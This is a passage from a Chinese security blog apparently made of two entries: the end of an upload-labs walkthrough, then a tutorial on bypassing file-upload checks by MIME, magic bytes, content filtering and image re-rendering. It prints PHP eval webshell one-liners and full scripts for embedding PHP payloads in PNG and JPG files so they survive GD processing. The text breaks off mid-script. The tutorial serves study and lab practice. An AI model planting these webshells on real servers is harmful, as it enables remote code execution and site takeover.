class="hljs-string">&#x27;.&#x27;</span> . $file[count($file) - <span class="hljs-number">1</span>];            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $msg = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;                $is_upload = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $msg = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;&#125;</code></pre><p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p><pre><code class="hljs xquery"><span class="hljs-variable">$ext</span> = <span class="hljs-keyword">end</span>(<span class="hljs-variable">$file</span>);<span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);</code></pre><p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。</p><p><strong>绕过</strong></p><p>burp抓包修改为数组，如下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215181210201.png" alt="image-20210215181210201"></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<p>本文总结了常见的文件上传漏洞的校验和绕过方法</p><a id="more"></a><p>先放几张偷的图，但是很实用。。。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210210161637992.png" alt="image-20210210161637992"></p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210210161842598.png" alt="image-20210210161842598"></p><p>一般HTTP-Header有以下组成：</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost<span class="hljs-attribute">Content-Length</span>: 274<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Origin</span>: http://localhost<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate, br<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2<span class="hljs-attribute">Connection</span>: close------WebKitFormBoundaryuKS18BporicXJfTx<span class="hljs-attribute">Content-Disposition</span>: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</code></pre><p>请求Header中Content-Type存在以下特征：</p><ul><li>multipart/form-data（表示该请求是一个文件上传请求）</li><li>存在boundary字符串（作用为分隔符，以区分POST数据）</li></ul><p>POST的内容存在以下特征：</p><ul><li>Content-Disposition</li><li>name</li><li>filename</li><li>POST中的boundary的值就是Content-Type的值在最前面加了两个–，除了最后标识结束的boundary</li></ul><h2 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1.客户端校验"></a>1.客户端校验</h2><p><strong>校验原理</strong></p><p>一般是在客户端用js脚本校验上传文件的后缀名。</p><p><strong>绕过</strong></p><p>1、浏览器关闭js</p><p>2、burp抓包改后缀</p><h2 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2.服务端校验"></a>2.服务端校验</h2><h3 id="1-HTTP-Header校验"><a href="#1-HTTP-Header校验" class="headerlink" title="1.HTTP-Header校验"></a>1.HTTP-Header校验</h3><h4 id="1-content-type校验"><a href="#1-content-type校验" class="headerlink" title="1.content-type校验"></a>1.content-type校验</h4><p><strong>原理</strong></p><p>模拟web服务器端的校验代码</p><pre><code class="hljs ruby">$is_upload = <span class="hljs-literal">false</span>;$msg = null;<span class="hljs-keyword">if</span> (isset($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) <span class="hljs-params">||</span> ($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) <span class="hljs-params">||</span> ($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]                        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre><p>代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p><p><strong>绕过</strong></p><p>burp抓包，修改与上传点要求的文件类型的MIME即可。</p><p>一般来说，有以下MIME类型：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p><h4 id="2-大写-Multipart"><a href="#2-大写-Multipart" class="headerlink" title="2.大写 Multipart"></a>2.大写 Multipart</h4><p>即将请求头中的 Content-Type 的 multipart/form-data 第一个字符 m 改成 M，即 Multipart/form-data（不影响传输）</p><h3 id="2-文件头校验"><a href="#2-文件头校验" class="headerlink" title="2.文件头校验"></a>2.文件头校验</h3><p><strong>原理</strong></p><p>用到了getimagesize()函数，检测文件内容开始处的文件幻数</p><pre><code class="hljs angelscript">.JPEG;.JPE;.JPG： FF D8 FF E0 <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span>A <span class="hljs-number">46</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span>（JPGGraphic File）.png：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span>（ PNG）.gif：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span>（GIF89a）.zip：”Zip Compressed”.doc、.xls、.xlt、.ppt、.apr：”MS Compound Document v1 <span class="hljs-keyword">or</span> Lotus Approach APRfile”</code></pre><p><strong>绕过</strong></p><p> 伪造幻数，在木马内容基础上再加了一些文件信息，例：</p><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;test&#x27;</span>]); <span class="hljs-meta">?&gt;</span></code></pre><p>或者是在文件开头处写下以下内容</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212195306465.png" alt="image-20210212195306465"></p><h3 id="3-文件内容校验"><a href="#3-文件内容校验" class="headerlink" title="3.文件内容校验"></a>3.文件内容校验</h3><h4 id="1-文件内容替换"><a href="#1-文件内容替换" class="headerlink" title="1.文件内容替换"></a>1.文件内容替换</h4><p><strong>原理</strong></p><p>将文件中的敏感字符替换掉，大致代码类似于下面这样：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path = <span class="hljs-string">&quot;./uploads&quot;</span>;$content = file_get_contents($_FILES[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);$content = str_replace(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, $content);$file = $path . <span class="hljs-string">&#x27;/&#x27;</span> . $_FILES[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span> (move_uploaded_file($_FILES[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $file)) &#123;        file_put_contents($file, $content);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Success!&lt;br&gt;&#x27;</span>;&#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Error!&lt;br&gt;&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>如果我们要上传php的一句话<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的语言标记中的<code>?</code>会被替换为<code>!</code>，这样一句话就不能被执行了</p><p><strong>绕过</strong></p><p>主要还是要根据实际过滤的字符来判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p><p>比如过滤掉问号，我们就可以使用<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;/script&gt;</code>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p><h4 id="2-文件加载检测"><a href="#2-文件加载检测" class="headerlink" title="2.文件加载检测"></a>2.文件加载检测</h4><p>一个灰常经典的例子，<code>upload-labs Pass-16</code>，源码如下</p><pre><code class="hljs php"><span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span>   <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;       <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;           <span class="hljs-comment">//使用上传的图片生成新的图片</span>           $im = imagecreatefromjpeg($target_path);           <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;               $msg = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;               @unlink($target_path);           &#125;<span class="hljs-keyword">else</span>&#123;               <span class="hljs-comment">//给新图片指定文件名</span>               srand(time());               $newfilename = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;               <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>               $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;               imagejpeg($im,$img_path);               @unlink($target_path);               $is_upload = <span class="hljs-literal">true</span>;           &#125;       &#125; <span class="hljs-keyword">else</span> &#123;           $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;       &#125;</code></pre><p>使用<strong>imagecreatefromjpeg（）</strong>函数调用php中的<strong>GD</strong>库转换了图像。</p><p>使用二次渲染之后，图片中的恶意代码会被去除。</p><p><strong>绕过</strong></p><h5 id="上传GIF"><a href="#上传GIF" class="headerlink" title="上传GIF"></a>上传GIF</h5><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p><p>例如以下部分没有变化</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212211325478.png" alt="image-20210212211325478"></p><p>我们就将代码写到该处</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212211352364.png" alt="image-20210212211352364"></p><h5 id="上传PNG"><a href="#上传PNG" class="headerlink" title="上传PNG"></a>上传PNG</h5><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,PLTE,IDAT, IEND)，每个PNG文件都必须包含它们.</p><p><strong>数据块结构</strong></p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212212307066.png" alt="image-20210212212307066"></p><p><strong>IHDR</strong></p><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下图所示。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212214948106.png" alt="image-20210212214948106"></p><p><strong>PLTE</strong></p><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>写入php代码</p><p><strong>写入PLTE数据块</strong></p><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p><p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p><ol><li><p>在PLTE数据块写入php代码.</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212215554445.png" alt="image-20210212215554445"></p></li><li><p>计算PLTE数据块的CRC<br>CRC脚本</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> repng = open(<span class="hljs-string">r&#x27;2.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)a = png.read()png.close()hexstr = binascii.b2a_hex(a)<span class="hljs-string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span>data =  <span class="hljs-string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="hljs-string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="hljs-number">0</span>]crc = binascii.crc32(data[:<span class="hljs-number">-16</span>].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-keyword">print</span> hex(crc)</code></pre><p>运行结果<code>526579b0</code></p></li><li><p>修改CRC值</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212215653375.png" alt="image-20210212215653375"></p></li></ol><p><strong>写入IDAT数据块</strong></p><p>这里有国外大牛写的脚本,直接拿来运行即可.</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;   $r = $p[$y];   $g = $p[$y+<span class="hljs-number">1</span>];   $b = $p[$y+<span class="hljs-number">2</span>];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);&#125;imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>运行后得到1.png.</p><h5 id="上传JPG"><a href="#上传JPG" class="headerlink" title="上传JPG"></a>上传JPG</h5><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">/*</span><span class="hljs-comment"></span><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><span class="hljs-comment"></span><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><span class="hljs-comment">    2) Save the processed image and launch:</span><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><span class="hljs-comment"></span><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><span class="hljs-comment"></span><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><span class="hljs-comment"></span><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><span class="hljs-comment"></span><span class="hljs-comment">    See also:</span><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><span class="hljs-comment"></span><span class="hljs-comment">    */</span>    $miniPayload = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($argv[<span class="hljs-number">1</span>])) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);    &#125;    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);    <span class="hljs-keyword">for</span>($pad = <span class="hljs-number">0</span>; $pad &lt; <span class="hljs-number">1024</span>; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = <span class="hljs-keyword">new</span> DataInputStream($argv[<span class="hljs-number">1</span>]);        $outStream = file_get_contents($argv[<span class="hljs-number">1</span>]);        $extraBytes = <span class="hljs-number">0</span>;        $correctImage = <span class="hljs-literal">TRUE</span>;        <span class="hljs-keyword">if</span>($dis-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);        &#125;        <span class="hljs-keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - <span class="hljs-number">2</span>;            $dis-&gt;skip($size);            <span class="hljs-keyword">if</span>($marker === <span class="hljs-number">0xDA</span>) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, <span class="hljs-number">0</span>, $startPos) .                     $miniPayload .                     str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.$argv[<span class="hljs-number">1</span>], $outStreamTmp, <span class="hljs-literal">TRUE</span>);                <span class="hljs-keyword">if</span>($extraBytes !== <span class="hljs-number">0</span>) &#123;                    <span class="hljs-keyword">while</span>((!$dis-&gt;eof())) &#123;                        <span class="hljs-keyword">if</span>($dis-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;                            <span class="hljs-keyword">if</span>($dis-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;                                <span class="hljs-keyword">break</span>;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - <span class="hljs-number">2</span>;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, <span class="hljs-number">0</span>, $startPos) .                         $miniPayload .                         substr(                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            <span class="hljs-number">0</span>,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; <span class="hljs-keyword">elseif</span>($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">break</span>;                &#125;                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.$argv[<span class="hljs-number">1</span>], $outStream)) &#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);                &#125; <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">break</span>;                &#125;            &#125;        &#125;    &#125;    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.$argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params">$filename, $data, $unlink = <span class="hljs-literal">FALSE</span></span>) </span>&#123;        <span class="hljs-keyword">global</span> $correctImage;        file_put_contents($filename, $data);        $correctImage = <span class="hljs-literal">TRUE</span>;        imagecreatefromjpeg($filename);        <span class="hljs-keyword">if</span>($unlink)            unlink($filename);        <span class="hljs-keyword">return</span> $correctImage;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;        <span class="hljs-keyword">global</span> $extraBytes, $correctImage;        $correctImage = <span class="hljs-literal">FALSE</span>;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($m[<span class="hljs-number">1</span>])) &#123;                $extraBytes = (<span class="hljs-keyword">int</span>)$m[<span class="hljs-number">1</span>];            &#125;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;        <span class="hljs-keyword">private</span> $binData;        <span class="hljs-keyword">private</span> $order;        <span class="hljs-keyword">private</span> $size;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$filename, $order = <span class="hljs-literal">false</span>, $fromString = <span class="hljs-literal">false</span></span>) </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;order = $order;            <span class="hljs-keyword">if</span>(!$fromString) &#123;                <span class="hljs-keyword">if</span>(!file_exists($filename) || !is_file($filename))                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.$filename.<span class="hljs-string">&#x27;]&#x27;</span>);                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents($filename);            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">$this</span>-&gt;binData = $filename;            &#125;            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params">$skip</span>) </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, $skip);        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);            &#125;            $byte = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);            <span class="hljs-keyword">return</span> ord($byte);        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);            &#125;            $short = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;                $short = (ord($short[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">0</span>]);            &#125; <span class="hljs-keyword">else</span> &#123;                $short = (ord($short[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">1</span>]);            &#125;            <span class="hljs-keyword">return</span> $short;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;            